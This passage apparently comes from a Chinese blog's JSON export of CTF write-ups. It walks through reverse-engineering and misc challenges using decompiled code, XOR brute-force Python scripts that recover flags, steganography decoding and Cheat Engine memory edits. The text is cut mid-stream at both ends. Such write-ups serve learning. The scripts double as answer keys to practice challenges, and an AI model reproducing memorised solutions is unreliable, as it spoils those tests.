v15 = byte_410A80[v14] ^ pbData[v14 &amp; 0xF]; v14 += 4; *(&amp;v24 + v13 - 3) = v11 ^ v15; v16 = byte_410A80[v13] ^ pbData[v13 &amp; 0xF]; v13 += 4; v25[v12] = v11 ^ v16; v12 += 4; &#125; while ( v14 &lt; 0x22 ); if ( v12 &lt; 0x80 ) &#123; *(&amp;Text + v12) = 0; MessageBoxA(hWnd, &amp;Text, &quot;Flag is&quot;, 0x40u); ExitProcess(0); &#125; __report_rangecheckfailure(); __debugbreak(); JUMPOUT(*(_DWORD *)algn_40BDCF); &#125; &#125; MessageBoxA(hWnd, &quot;Wrong answer&quot;, &quot;HACKMECTF&quot;, 0x10u); &#125; else &#123; MessageBoxA(hWnd, &quot;Say something!&quot;, &quot;HACKMECTF&quot;, 0x10u); &#125;&#125;return MEMORY[0](hWnd, a2, a3, a4); Text处存放的就是flag 赋值语句： *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF] v11是输入的string，pbData可以在上面发现就是dword_4128A0处的值，由v12 &lt; 0x80可以知道flag的长度不超过0x20位，爆破脚本如下： 1234567891011121314import stringbyte_410a80 = [0x1A, 0x8B, 0x24, 0x28, 0x58, 0x37, 0xAC, 0x52, 0x53, 0xB5, 0x1E, 0x3E, 0x4A, 0x25, 0x4A, 0x27, 0x6B, 0xB2, 0x17, 0x01, 0x03, 0x0B, 0xF4, 0x14, 0x00, 0xF1, 0x61, 0x70, 0x0C, 0x55, 0x20, 0x7A]pbData = [0x34, 0xAF, 0x0D, 0x07, 0x4B, 0x17, 0xF4, 0x4D, 0x1B, 0xB9, 0x39, 0x76, 0x5B, 0x02, 0x77, 0x6F]for i in string.printable: a = ord(i) flag = &quot;&quot; for a1 in range(0,0x20): flag += chr(a ^ byte_410a80[a1] ^ pbData[a1&amp;0xf]) if ~flag.find(&quot;FLAG&quot;): print flag 如果flag中有”FLAG”的话，flag.find()返回的是“FLAG”所在的下标0。所以加上取反号，就可以打印出flag。","categories":[],"tags":[]},{"title":"geekgame-2","slug":"geekgame-2","date":"2018-10-11T09:44:59.000Z","updated":"2018-10-11T10:19:52.530Z","comments":true,"path":"2018/10/11/geekgame-2/","link":"","permalink":"http://yoursite.com/2018/10/11/geekgame-2/","excerpt":"","text":"陈师傅线代考了满分？希尔密码，动手算一下得到flag。 Fuze.vs.Zombieemmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….","categories":[],"tags":[]},{"title":"geekgame-1","slug":"geekgame-1","date":"2018-10-10T15:35:34.000Z","updated":"2018-10-11T08:21:26.139Z","comments":true,"path":"2018/10/10/geekgame-1/","link":"","permalink":"http://yoursite.com/2018/10/10/geekgame-1/","excerpt":"","text":"代号为geek的行动第一幕：毒雾初现查看源代码SYC{}里有一串摩斯电码，解码得到flag。 萌萌的血小板改后缀解压得到flag.txt和一张佛像图片，用佛曰解码得到flag。 小帅圆圆的发际线，你也想要么？gif后面藏了一个rar文件，解压后得到另一张图片，内容为brainfucker，解码后得到flag。 0xpoker的QQ1234if (str.equals(&quot;U1lDe0VhMnlfQU5kcjBpZF9SMyF9&quot;)) &#123; return new Decode().decode(str);&#125; base64解密得到flag 可能没有你想的那么难ida打开搜索字符串直接得到flag 换个样子你还认识吗ida打开，主函数： 123456789101112131415161718192021222324252627__main();i = 0;memset(v11, 0, sizeof(v11));v8 = 0;v9 = 0;v10 = 0;v4 = 28;v5 = 13;v6 = 59;v7 = 22;BYTE2(v9) = 85;printf(&quot;plz input flag : &quot;);scanf(&quot;%s&quot;, v11);if ( strlen1(v11) == 20 )&#123; for ( i = 0; i &lt;= 14; ++i ) v11[i + 4] ^= *(&amp;v4 + i); if ( !memcmp(v11, arr, 0x14u) ) puts(&quot;success&quot;); else puts(&quot;you faild&quot;);&#125;else&#123; puts(&quot;you faild&quot;);&#125;return 0; 输入flag之后与v4字符串异或之后和给定的arr字符串比对，逆运算可以得到flag。 需要注意的是v8,v9,v10是int型，占4个字节，并且byte2（v9）把v9的第二个字节赋值为85，感觉写脚本逆运算还不如手动解，所以爆破脚本如下： 1234567891011#!/usr/bin/env pythonimport stringfinal=&quot;this_is_flag_gg&quot;key=[28,13,59,22,0,0,0,0,0,0,85,0,0,0,0,0]flag=&quot;SYC&#123;&quot;for i in range(15): for ch in string.printable: if ord(ch)^key[i]==ord(final[i]): flag+=chflag+=&quot;&#125;&quot;print flag","categories":[],"tags":[]},{"title":"bugku-re-1","slug":"bugku-re-1","date":"2018-10-08T11:03:15.000Z","updated":"2018-10-22T02:35:21.897Z","comments":true,"path":"2018/10/08/bugku-re-1/","link":"","permalink":"http://yoursite.com/2018/10/08/bugku-re-1/","excerpt":"","text":"游戏过关虽然ida打开之后函数很乱…但大佬说过用ida都是可以做的 搜索一下flag试试，直接找到了生成flag的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122sub_45A7BE((int)&quot;done!!! the flag is &quot;);v59 = 18;v60 = 64;v61 = 98;v62 = 5;v63 = 2;v64 = 4;v65 = 6;v66 = 3;v67 = 6;v68 = 48;v69 = 49;v70 = 65;v71 = 32;v72 = 12;v73 = 48;v74 = 65;v75 = 31;v76 = 78;v77 = 62;v78 = 32;v79 = 49;v80 = 32;v81 = 1;v82 = 57;v83 = 96;v84 = 3;v85 = 21;v86 = 9;v87 = 4;v88 = 62;v89 = 3;v90 = 5;v91 = 4;v92 = 1;v93 = 2;v94 = 3;v95 = 44;v96 = 65;v97 = 78;v98 = 32;v99 = 16;v100 = 97;v101 = 54;v102 = 16;v103 = 44;v104 = 52;v105 = 32;v106 = 64;v107 = 89;v108 = 45;v109 = 32;v110 = 65;v111 = 15;v112 = 34;v113 = 18;v114 = 16;v115 = 0;v2 = 123;v3 = 32;v4 = 18;v5 = 98;v6 = 119;v7 = 108;v8 = 65;v9 = 41;v10 = 124;v11 = 80;v12 = 125;v13 = 38;v14 = 124;v15 = 111;v16 = 74;v17 = 49;v18 = 83;v19 = 108;v20 = 94;v21 = 108;v22 = 84;v23 = 6;v24 = 96;v25 = 83;v26 = 44;v27 = 121;v28 = 104;v29 = 110;v30 = 32;v31 = 95;v32 = 117;v33 = 101;v34 = 99;v35 = 123;v36 = 127;v37 = 119;v38 = 96;v39 = 48;v40 = 107;v41 = 71;v42 = 92;v43 = 29;v44 = 81;v45 = 107;v46 = 90;v47 = 85;v48 = 64;v49 = 12;v50 = 43;v51 = 76;v52 = 86;v53 = 13;v54 = 114;v55 = 1;v56 = 117;v57 = 126;v58 = 0;for ( i = 0; i &lt; 56; ++i )&#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u;&#125;return sub_45A7BE((int)&quot;%s\\n&quot;); 两个数组每位异或后再异或0x13得到flag，脚本如下： 12345678#!/usr/bin/env pythona1=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0,]a2=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0,]for i in range(len(a1)): a1[i]^=a2[i] a1[i]^=0x13flag=&apos;&apos;.join([chr(i) for i in a1])print flag 逆向入门windows下打不开，显示版本不对，ida没用，od也没用，用hex fiend看了一下： 1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAYAAACAvzbMAAAgAElEQVR4Xu29CdhuyVXXW4dAmBIghqEDCIg5aWQmAyhT0oCgkj6CE4HjdT7pgHLVpGVwgsP14nBDixMGGofHxyYRRzodFS7Y6SBc0SSAECA5DDKmQcKUMKPnPr/vPdW9z9t77/rV3uutd7/fqXqe7+nkvLWrVv1r1frXsFbVhevXr19PPXUEOgIdgY5AR6ASgQudQCoR69k7Ah2BjkBH4AyBTiBdEToCHYGOQEdgEQKdQBbB1j/qCHQEOgIdgU4gXQc6Ah2BjkBHYBECnUAWwdY/6gh0BDoCHYFOIF0HOgIdgY5AR2ARAp1AFsHWP+oIdAQ6Ah2BTiBdBzoCHYGOQEdgEQJVBPLmN785PfDAA+kNb3hD+omf+ImbKiQe8cKFC4uE2P/IlBWVZ0rg22+/PT3taU9Lz33ucxe16TWveU3Kf0sKOHT7DOaRGDzjGc9Iz3nOc84wPVTKeKOfue/e8z3f81DVhZW7dlwZXUFYk28sDxhmPJ/4xCeGtXu/oJe+9KXpjW98YwKPNfVhm7Kdohx0j78lKZfz+te/fsnnizE343ORQBMfLe1jTSAMyrvvvvsxxBHZiC2WheK9+MUvTjUD5+rVq+nlL3/5FpuzSCYG4Vd+5VdWYXDPPfekr/mar3lMfc9//vMTf9Fpqr4XvvCF6bM+67Oiqwsr75TGFUaGsRA9CQCDL/7iLz6bmA7TkvoYd4y//YQOoAs2QWLYOyYlt1KqxVwRCGBevnz5liOPrDh33nln+qIv+iKlR1/1VV+V+DtvCSKFREyaGsT5W4wQq5GoVMIcuZfOQKNkHCvnFMcVE6n777+/ajJRwhDjvk8e+ZuayQvG/q677pqsrmbyct4mgaU+2Cfu++67T/WxIhBmkszwbuXEoDHbIc985jPPLUzWEF+6dGl2sgGO4BmVSpg//elP3ySpl4gvCp/ocmoMcanu0mSD75m8MYkrJeR67WtfO5vt1a9+damYM91Fh2/lZFfuikBYXrIXeCsnM2suzYBOHT+jVMyq77jjjmJTzUAuFpLS2czVbFFF1Wdksnle9KIXpYceeshm30y+Zz/72enLvuzLQuQxJPqZn/mZCaxKCb1D/+YSk+HSFtwrX/nKs+2rWzlx9ovdLyVFIIbZSxWd+u9m1tUJJJ0N4JYEYmaw6J5dQbbU01MdV5ErSIOBXUGyLfqWt7xlNYEYUmupJ8eoy2LeCUT2TieQdHYoXpq9ASfbDXjTTCXKGDtgl11xUzZmwnjvlJJZQZbKiP7dGM/oOqPKe/DBB9Ueeak+i4FZQZZWdE94whMSq4tS6gSSUieQkpZU/n6rE0jNtkVpC8CepZS6iL1qtq9Ks07KYdZsDwZL9Ub9bo1nVH2R5dQ4lszVazEw46+0nWm2YJG1E0gnkMixclaWUeDzuoUFebAfWuPKzAqDgTg07swAmSWaA9FSB065fs59xxYHB7I17SjJseZ3azzX1HHIb82YKNVfgwG6w3nIXGLygq7uTypqZO0EcmQCwVCwTUEg2lYGa1Y6Zq38lbw19pXUKOASAgEn/oyHV2kw8jttw7hOuUWaMp7ylKc80n9rgv+QhQHNYEYnKGusncjKlpcN1iK/2YoYayv6mNuEfl68ePFoOlpjPE2/HSMP/ZnxzLpcI0ctBtSB112ua2xLlXM49AOdmtO7KTmXEAhbPmARNY5rMJzLCxaMK8aMWannso62hcUMAaXYGnHsg4xxw9PCGtpoAsFIs39vzhSWKBNkxkxs7ixiv1wGG99ExmiUlPvYwVroKauSVm0e4lFrPJfoQetv0Gd0yOr1Wgyoh/OtSMNdQyAYWtobWf8h+gwioV3mvJD6j0Ig1t3uEAAtKRNQ2UM3RjaSQDDUeA8dmmRrzgjAL+pswvbFXACZLSMq3zEO2dcaz6i2R5eDXnPeZIxqBAbRwY2WQGqCHKMxXlqedTppTiCtjOJS4Ka+Kx345u8iCcQGRkW01Q4G6/cdIRNlbC04FSOEZ1HLFGE8W8pbU5d1uojCIFJ/7Zg5xqSjpg/G8jJp5gyytJ3VnEBshWsBOMT3pUhm6owkEOsOG9FWey7TktQynrXnUBF4zJXRegUWZTwPjcuS8i0hR2EQ6RpuCcS4Fi/B7tDfGMytPQ+LAzEG9tDALC2/NYFE+dCb9tprGbrx9FdmGNxNHjOQTTlbzWMMrN1SMW009ZlyzjuBGMw7gRhNuZGnNYG0NNaRW3QVkBazbvF6nNZneEbvikBuNINdEdibBEwzo8bVeScQ075OIEbjjkQgePywf9oicTupuZK6daCd3VprgVGuo+U53tbOgKJxtkF7dk/eyBcV3GgMLPJErXhM2yLzmPZ1AqlA3MwEzRZdjVFsceZgFGUIU9QAtNBv0Yi2CDbEdRxiL138Z3HcWr7aA+2p4L8l7YoYV3bcdAJJqZ+BpHQWmFRK0QRCfRgrjDbBbMblsSQjv3Pmce3atTMvJ7Py2C+TrQfca5cEhRn59vMgI7LiSm1jcpbUU/MNfUF/R2IAWdAvGMuoe8Bq2nTovMQ18YfuLImpQW8x3GuDYCPGVSeQI8SBGAOblZjBdO+9954Npv2ncdcqOoOeveya6zKORSBr29rie4xBNqY19eU+Zo+b/41XDn1y5cqV2fgXdCIbkpr6DpkXneIajSWPUtEWnkJYq+fIQD9k44yhBVsbGDbEJ4+PHOy3FPN8NQ0yRcc00T62edd66uWbB9hSszIegkDoJ/orepKUbwIojath/5v2bXYLC2PC8j0ayH0DUnMg2gmkbH5rfN7nXtozwVd8j8FeazzKrarLUbs9EhUoOTeYaw+h59pQ4xXW6rzIeAyZXqwJbjQGljrtFlZUG+baacZV/t60b7ME0gLMDJT1yugEUh6CNdG+JQ8rQ+7W/bgseVyOQxihknQYara85rY4S9eY5zpKwX01NxfYsVVqn/m99DyAKYM89llmY2AtgVgvSNuGuXxmXPG9ad9mCaT03GkEkLkMe5jXCcShblchJTxbB5m51rlc1ruoxeojS2yNlFlB2VWInX07VOdzGYNn6zExWLY+g0FpMmXlNvnsQ1+mfZslkJJxMUDZPBYEI5M546nxwrJt2FI+g4FdOZjB13K1anG2szyjU6ZOU1/pHYxcj7kBIdK4mPaZPLXbdHNlmpWTwcCuQCwhGxxMHjOuTPus7WzuhRU1sAyYFgQjU6TxNLJvMU/UCsQOvkjDEYWn0QPqMjplZDKrBlufMS7G4NlxZdpn8hiDZ8ohT+sViMHTym7ymT42eNo+7gQiB7s1HFFbF0ZZWuYxe/FZntKevN1arNmTb4WFfVs9gkBqMC9tlRjMbVCfNS5RfRI1pmx0vDGwdhLUCeTGRYIljxhrYCMGllVMq+hGJts+thPIW7rt0rZhK/ns3j/yzhmiWu+dLQUbWh2wK4JS37bGnLdZzENddlyV2md+t8a8VBZ6R1nmnRJbp5ntdwLpBHKmmzXGI8qHvTQoWvxOcBgritrgMFYPzIqHE48lT+PSxshI5SWYLXmK10xKpmRZ+rDXmPuzefCIvrp69aoOPG1BIDmOKCLoEnkhR0Me9EknkA0HEq4ZWLWD3yq6kamGQIZyLokGr23nfn6esCR4bUmsDYSB2yQujww4G3w1JzMYLAnC2y8To0KbcvT6oVZ5GHC2TZAZPJbcEmB0KrdvWF8LzCEM9AMcwbP2ShU7rmr0GBkItsuR6GsCL5GPCQ9PFi/Ru04gnUDOdNcquhnsSwmkZhBF5y3ti+/XB154PkWQRnRbxsjkEMGGNQFZc200OpV1tCXmOCbcc8891aQxbKsdV1YHIA1WCGtII9cVMU47gXjb2Q/Rgw/R7aBplc8eQDLTZrvgFMgjY2cPfS3WNYfWpTINgdSeB5XqLP2Ogb58+fIq8qiZmJXk4fe5WwvM98M8pUBJW14nkE4gfQVyY7TYILOImZsdoJH57GA3dRpPJVMOeQyBtMY8Kq4mcgUS6aptYjxM/1md6ofoR7iN1wws08kmj1V0I1PrwW7aZ/LYwL6owWdkisxjCdLUWeP1VCrP6JSNqynVZX+P8giy48rIFUVq1GUMupGpE0hfgfQVyGCkGGNm4xvMAGyZxxKkkSmSRA3mkfWZ9kURiL0yw8hkjXWpLLZgWc1EJCuTIawozG27jEymfXaS0M9ANrrdYBXG5CsF9rEXb/z/TV3HyIPHTYRHVqRB3yKBRMbUmIhuowtRK8io8w9kNgbWrng6gfQ4kLNxcKpbWMheuiup9VaKMSw1eaKM0HknEA6scarg8a61KfJZ5tIEpyRrpPNDJ5Ad2n0FUgGCmS2eMoGgEGPBeAw82oVROfXE7JqZ45qVyHknkDyZwL17SYzQvo6gNzUPGU3pGMSGTA899FC1GrJ1xbdL4j2mKusrkE4gVSy6dQLJwXM24Iv2MIPYT8NAvPxc65IguepRHvBBDjCjDQSIjbWP85Ccj71g/ncNodwKBJK7giBC/oaYLekm9CfrEnrH88xLXcHpL/rN9llksOuw7Z1AOoGcCwLBWHLFxJLzCQY1MzN7fcMS49Him6krLTAe3FQ7R4Bj16nMyXwrEcg+DtZolvqc/qBfIlcEpTqjf7dYmAPrfgbSz0DO9PMYW1g8/bvmKpSaVwSjB2FUeRDolHeNuV21Zt//ViaQmr1/07fm7RFTzjHydALpK5CTX4FEBVhFBse1Hsylw3/kMbEb9pD9VicQ8Ix6PjbSK6q13nUC6QRy8gRilbg0uKw3RamcY/xu3E4NQbIKueOOO4pN6ASSzm5eXnKYvQ+ufba42ClHyGDHXt/C6pHoZ+q5xUP02osQp8ZZZIBV67FsBrKd6ZqZdScQHwNhdMEYWFNO6zxG75DJtK+fgQSfgdjL/SKUxrwnvVUCMbNvg5E1sKas1nnM1pM9mzIDOSo4zupUJGFF9Q1nbpy9rU3mfGptHYf6PpJAIq9qKbXXYm7aZ3cumkeiR+3tl8CsCS7a4gqk5vB3DotTPsykXXMTjprbbEuG0WyFlXRu+LvRqS0SSAlzi8EpB6caA2tXIC2fZcb7jZV2KZn2bZZAaNyhWbn2BTkz2O1Mt9R5Nb+vfR7XKlSNTK3zggH78vvR0/QxelTjLjq1qjvEOyhGp7ZKIFOY2763K39bXut8xsBaAiEfk2Z01ca3LGlvDeamfZsmEABiRgiwEY/IDAEnyAwwawLkzGBfSiClt+Sz7GOBcfyWX2oz+625LDBgJnLqMSC5PWCAruR4GPqLFcNUH2MAp9rOb5TFq40c9HIlh5m11Q5qo1NLCWRfp65fv54uXLhwk4gQ7Jr+z5gzTm0AK/2RX7OsxesQ+ef0YK4+Y2BrCIS82DleXETvItMSzE37Nk8gkSCuLcsM9hoCqX1jOsvPbJrZ9pqBvxaLU/1+DPOoqzaWYGJ0qoZAMOTExNROuCBIVqJLo8OXtP2Y34wFnpqg06HMxsDWEsgxMdmv27SvE0hFj5nBbgmEWQ+HkHbWNibmqZ9bVEAfknXupb2oJ2prBTU6ZQnEOBPMyXceAkoN/ow5xt7YPV9gAN5mcmYMbCeQXY80P0Q3itA6jxnslkAivMysN0VrnLZaXwnzmv3hqDYanTIEglG8dOnSqgkJbYp2EojCKbKc0tmqHVedQDYcSBipMFFlmcFuCMQGrBm5T/WBJ9O2yDwG88gHkKzsRqcMgZS8x6w8pzxjtm0sTSQox7hqdwI5AoGc8gzHDHZDIJGD3RgXO7DOcz6LeY0TQgReRqdMH1tjZmQ+75OS1pi31inTxyaPCVJufgZiKzQNbJnHzGCRpzWBnPfBHtXHnUA8kqdq8GwLWxOIWc1Y2VvmMys1a8/DzkAA4BSNno34bkkgdq+2pdJtta5OIK5nTnmHwLXQXUkUueozF3la2Vvlw+GEM7VSOgqB4C5HBOqpuAzWeEy1IhD899m2MN4iJSW4FX7vBFLuZe5DY6J0KuOy3KLxHK1XIDWeXUvbFPndnJfafj1HIRCE4MCSWAbuYNpqAsgHHnjgzFBbd9sWBAJmYFcTBLlVjFvJ1QlkGmkmI8SBoFPnnTxAoTWBUCe4YhtY4W0ZY25YxkvNxhEdjUBaGY7W9RyCQOgk9iNZbUyRBh1+7733PtLxRJk/73nPW0QyxBNAnJSJshM1jOLXphwdn6OUc/T/klUTq0AidLNis4rF7dYOxkMQSATmxzBm9CP9CWnM6dRazIf6gj4R2Y9OoMO5/lqdAvOXvexlj0RqUxbvrddMpo6FeW1bTyF/J5DgXoomELN/isEn+nh/lbRk6Tz1sl/ttiPG5+677x6dydTevTV1sSZG4yUveYkyHtEEMoc57cM4m3QMY2b29yMwp/3oJHow9mImExOwsmlqKxk93zrmto2nlq8TSHCPRRKIuWK9FECGkb3vvvvUTL3kKFATaFfy4LBR9KXXBiE2DGIpRRJICfOaiO7WBGL0s4R5jfNGKWjPTJAyEc0FSm4Z85JunvLvnUCCe88MUGvMzEyxZPRpnp3xl4w+ZRkXT9M+S0bGF93gZGSy7TOYW8PYmkCMS2kU5ua8wZKRed5hq5gHm5hNFdcJJLg7IgkkarBbY22MmVk5GANrFc+QmiHISAIxBjYSc0OQJpCQw/J8U/Gc2ptHtYyxLq1ksgxmUlJayeRzHfqmlIyeR2FekuXUf7fjWMWBmE4+dcBK8hvFs8bMGGtjYE0nW5mMsTaX+pntOTODJY8x1obUKMtgbgyswZz6OCspvf9g4qYM5lYm0z7zEJTVKUMgRibbvigCse0r2YxT/t1MmGmfIhCzzDxlsEqy25fvrOKVjLWNjkfu0mrGzGCtsTZBSGYGa4wiMpltELNqMNt9kZhTH66zuE5OJftWfRTmmUTvueeeWXU3pGb1/FQJBF3AEaA0ASjZjVP+vWSjctsUgZDZzBROGbA52Y1R5Hs7sEoHg3i3mC2JkuGfu+Z8rL1mlTVHSMbgU69ZXWX55rC3eFNWJOasLpipz6XSU6YG61x+CXPKsm7Pc9jbWafF/VQJxJLtebV3dhdBr0DICCuzlYXf962SWHkwqBh0JtmBlWfXzJ6HsRNgjLutJY8s09jDSUseILJuk2MGzTwLu/ShrTHDNuVuO9dPeK5h+PcxJ86GLa6aZB6r4qyAPh6+T4FO8W/WHTjLhHzgPpwVgzll1cRKoGOsjvZfNbTkUTNROmUCySSyj3mNjpxiXraN0QU7IdErkAwGRoABMfZoyykCNiUzbqQYGgtkzcAa1kkdBOJlXG1k/L7cyJmDx3g2c03/5HL4bw5K268POakDuZF/LIiQ3zBU5EOmsZgBqzMYyVxHrtd+u58vGnN0BfmYuY3pSw645LeaN9yXYG4xyX2ScT2Enp86geSJM1it0V3bJ8fMx5iYCz6dkq2aQI7ZyK3XXbMC2XpbhvIteRaVczP225cS4inhk2XFCLPCWUMSp9Buq+fngUBOoT+OKWMnkED07cAKrLJZUWbfPwtjD8mbCd+wIkiEAM+abaWG4oVUZfW8E0gI3JsupBNIYPfYgRVYZdOijCssAhFZbC9ta9qARpXVHEI2Eim0GqvnnUBCYd9kYZ1AArvFDqzAKpsWZbzRatxhmwrfsDLrjdZQpNCqrJ53AgmFfZOFdQIJ7BY7sAKrbFqU8dTpBLLrEmM8m3ZeYGVWz01MiYlTMgGlNM8Eb9pVdCBc57qoTiCB3WsHVmCVTYsyBIJABGG98Y1vbCrb1iqrifPYmuwleayem6h2E6Rsg9pMrNp5JvZSvx3i904ggajagRVYZdOiLIHY60WaCt+4MnubcGOxQqqzem638uaCG2teUyzJZfU3BKRbpJBOIIEdXVLgwKqOUlTNAOz3p+0i7jk3Om+pRs9ZjYLBXJzJWMAlmEEe6FHNQ2VTk5fz7thwLB07KoGwX37t2rXHtP369evpwoULs5hM5SE6d20i+O22226rdsWsGVhZRiKTawaIadt+lLH5xuSpIRDKAw/+2DbASKy9WwicwMukqPqoa21QJnvzXPS3RKf224p328MPP3zTP5vxwgdj+ZboX62e55cKCTi9ePHi6LjCFrCdlbGmryGfMeLJGFDW2O+UgSs5was5yHUq8n9srFg8x/RwSiajszV5xvSg5vv9vEv0gDKOQiBLr7SwAJlrJvbLQoH3r7SwV3vksmoG1tIrLSwGDCCuuVhrtIf11RLIvqzgg0y15yO11ysM+2NpfVz3MUxRKyoM4/4VNqZPl1zdYsolzyH1fEwGCIVzjdqAy7HreZYEuSKTOby3+O3nW9rHpr6p1Zr51uSpHePNCaT06ptppMlTuwc9tw9rDgORyRII5MFS+9DBZvbdBoMneWqVa6xc+h+sLYmsrbP2ZtU5V+XIs50ab6BWgZnGTbtGz0t6VeNoMDe2al7nRKaay0pLbZj6/RABpdHjeUp26/V2lBWIvX57accNv7PeGyXDULrJtXYFYgdqBAaRM621xjy3xxpEe+V5CSfj6UMZ5tC35ibhOblMXXzfasKVVyImit5OlEr9wrjiOQKTSsGp1uhZ3TMylfLUTmJL5UXpXqkefrfk3nwFcscddzS7H+m5z33u2XZBKRn3PwOoHVg1s8+S7KXfrUylcqJWILke8/iP7b+S7OZNDdu+SEIuveWCTJH9V8LJGo5Imcy4MjNvS8hRW5EGS/JEug2bMWPlKuWzk8XmBNISBPuSmWF2s41lB1akUpUUgd+jMLdKZWQyQV+R9RkMzMowcgZrjGdpdWywrsljMLd6buo1uwR2BWnGlZksGrltHtPHpixDoqYcm8d6rZ1rArHL2tLrcdEzM6PotqNNvqjAPkOiRh4brW6VuFSnHXxGX+xqpiSTXfFEGusomSInJQZzu+ozK3szcTE42TxRBBKJuZHdTCQo51wTiO280qzSLo/tYG9NIHYAzilWTUBXSUHtrNqePZXqs+23h7FRs1irV2aFXMLA/m4Nh5l0mTpLelXjdFEio9I4N/LW5rE2yJQbhXmprhonn3NLICVl2gdx6nAfMDFAJlZjqwRCW9cYITBg77jW7XJMUVkN3HXXXfocrOYa+bH6bJ/kb1mtsa0yl0rP1ZYG6PB3E2wIZhj2SJfsKRktgdQY9hIec5jzQidbWDZNrZJrn3e29ZXyRRIImDN21sQlleTld7OtmMs5dwTCuQeDsvbJUABhhsLsmOAiZkbZn9u+1maNVesVSO5siJA2WgWEOCANZj5rXY5zcBcy1Cb6gYFD39q+OHR9+Yln+ty6JE+1G4xp31wQGgYQEqdda+ubw98SCGWAAf0JBlanpuoe9jF5CDCGDJaUy/jHAYMywe2hhx46k/MYj5tFEkg05sO+yIGE6GHNRPHkCQRDj4ErPceYFR1lByD+GCyR6RAEwgBC9mGELnKbFVFk24ZlMRB5bXDt07mHki+y3Pzk6xzm+XlfJh8YqzUp18eB/lrSzjcB1JB2DYHst5P6mKC89KUvXQPBZr7FqGJbiGbHzjAGa/s4mkA2A84NQU6aQDCidNDcrHRu2Rftpx1NIHPeJ1EH2rUKWbsFVVv+lvMbzK3HUKmdkc/j1myBrSGQ3KZjnDWU8Kz9fc622DM86uwEUot8Ib9xpzRV2oOekt93xIDJ8kYSSGnPNuqA2WA9zLPmLKW2rq3lt9HFUYed9lDf4GSNXtR4sI4LRvZj5Cl5dFlHik4gwb0XRSA2xqNUH4OUh28iUiSBmAFYc9jVsn0RdW21DBMrYvXAtNGsekw51nU6ikCs67SRvXUeY1vsKqsTSHDvlQy6rc4oulXiqENtazhMfebKF4OBxdPks7NYU9ap5jHefdZYGwwi+9jEQETWFzXWDU6RecwNCNa2dAKJ7Bn57KSp0s7MjBIbg25kMkFm9n4nswKJHOymfXbWZco61TwWc6N3BoPIVaaRyRhPIzd5TH22rJb5Ivs4yra0bH9NXc0P0aP2h817ywBR2quMinbOoJeivu0ANauZ0j5tjSKYvJHxD6a+LeaxmEcZT6vnJayMPlFG5JZuFAaltkX/bgmkZMvMVli07K3La04gEUbI7ENnIOeWmvYgvqZT5gYq9eGlY2MZ5raxzFZKjdw27628jVWDeYTxtIas1HdsqV2+fPksJsKkqHojMDDyRuex7S/ZMjvZiJa/ZXnNCYTGLX0UBQNM5+IJVJPG6jvkoy9jDycxG4EQan37x7ayrILXYFSTFxLEu61FZHSNXIfMW4v5GuO5VM/H2r90rC15lG2//jUYHLIvS2XX9HVr21KSvfXvRyGQ3EgYvCaqtiZCcgzIXB/nEGOGnJnaAw88cEZw+7O1sWcuc4AR21JTT2tS5lR9NZ0NKZGmMMhBYzlfTdnknWofREv7poxTDiaEVJYQCsaSbb9SIGhNe3JgHzLV6NewjhzJTB8v0bsa45kxQE/m6kM30cv9Pp56gpW221XHFL60PQc3Tun51Lc1GFDGEPOa/p7LC1acQ9Q881xDIPu2LGKsl9qexzp2ykTX58DpJXpckuWoBFISruXva54MZYBxqH+M6HAUiPuCkP9QCcWjfaWATfaEawYq50+syuyWXm378nUjGF6bolam1nhSH9jOrUxpB6/oLZ0c2LaX8tXqeQ0GS575Lck7/L1m63UJgdTIsiYvN0DQliVp6fO/c3V1AknpbJbGHrFh8ykwI4O+apSjFChZU9ZcXhO1X/N8bOkW1ii5KafkSLFvaCImAsZ42jO4Fk+wWrxr9NxgQL2tzgqMZ2PWl+hrjiy+c/lqSHCqnJpzPCNzJ5CUzmbBNbPUKWBrDvdN55TyRMYblOrid+PTbgdpS6ysB5L1kDNYGeNpBrONNzAyReWxM3SDQSTmpn1GJts+U19knqjXXKM8+2hbJ5DKGeqcQrQeDNYwRimxMfpWJkNGUXJTjjEcpn1WJlOfiWWKulvLym3yWdd3g0FrY22u4mktk8HcxGOdw2gAACAASURBVJiZcuxE0JbVCaQTiNWVs0PO0hvzdlXUOsCqFJ8TObDsqsGQqF3R6U4MyGjjG7ZIIGa3oROIV5JOICmduaRGXEEdOYM1XWiNtSnL5LEv6JWMtS3HyGTzlIK+KCeK1GzEfieQlOxqxvZzKZ85RzD9UqrnEL+bq2hMvQ8++GCY40onkBuH6Cxtl7ih5g47hlGk7tYzVHO1RsmAHmOAloK+omadNUF7BofW/WsMUOQKJHLlZ2Qvvepn22bqis5TGlemPnPuZsrJeTqB3ECCbQdmqUviBqJcP2s6bpg3agVl6sflFhIpvfg4ZvjyAz2sUI6RGIBsYexPFKIGVa1LdSeQnRZEvn1i9GoquBLyYCwdyq3cyFbKs2ZCYbagS/Xv/34wAqmJB8jPKdYKn/MzcHkCcz9NBVhN1Uc5+clXAuRKiT1eyKNkTEvlRPyen3BFbuuOXNNH+zLmdhP4xlOsY3EMzPrBE4MN5uA0le/hhx8+q4JBfMiU+zhPFJBpjdsuGOZgStpqsaeNxyQQ3Kj5I6E7NatvO0s3ZyDDvs59sf/d1Di2ejKlU8PnndeO44xhpC277bbbZsfVWMDzPiaQIWN0rZ5PYR1OIHiNEOxSM5AQDsPCzLY2WpKziyXvHR971WCV/5D5MPDMyNcQSZZvSZDS2IwdhWc7iVXBltOawNPcrmMQCAaOPh9OevLb5vYc8FAEcqj+tqvmJfWPrWbW2DJWQPukil3c6qoolEDMAVWpk2qCitYs55DDvjBXkvnUf68JtJtr